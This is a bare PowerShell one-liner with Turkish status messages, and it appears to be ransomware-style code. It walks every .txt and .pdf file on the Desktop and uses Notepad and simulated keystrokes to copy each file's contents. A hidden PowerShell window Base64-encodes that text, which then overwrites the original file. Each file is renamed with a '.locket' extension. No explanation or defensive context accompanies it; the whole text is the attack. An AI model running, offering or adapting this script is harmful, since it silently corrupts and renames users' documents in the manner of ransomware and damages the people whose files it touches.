Add-Type -AssemblyName System.Windows.Forms;$Dscpt=[Environment]::GetFolderPath("Desktop");$Exts=@("txt","pdf");foreach($E in $Exts){$Fs=Get-ChildItem -Path $Dscpt -Filter *.$E -File;foreach($F in $Fs){$Fp=$F.FullName;Write-Output "İşleniyor --> $Fp";Start-Process notepad;Start-Sleep 1.5;[System.Windows.Forms.SendKeys]::SendWait("^o");Start-Sleep 1;[System.Windows.Forms.SendKeys]::SendWait($Fp);Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("{ENTER}");Start-Sleep 1.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^c");Start-Sleep 0.5;Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `" $clip=Get-Clipboard -Raw;$byt=[Text.Encoding]::UTF8.GetBytes($clip);$b64=[Convert]::ToBase64String($byt);Set-Clipboard -Value $b64 `" ";Start-Sleep 2;[System.Windows.Forms.SendKeys]::SendWait("%{TAB}");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("{DEL}");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^v");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^s");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("%{F4}");Start-Sleep 1;$Yeni=$F.FullName+".locket";try{Rename-Item -Path $F.FullName -NewName $Yeni -Force}catch{Write-Output "Uzantı değiştirilemedi: $($F.Name)"}}}

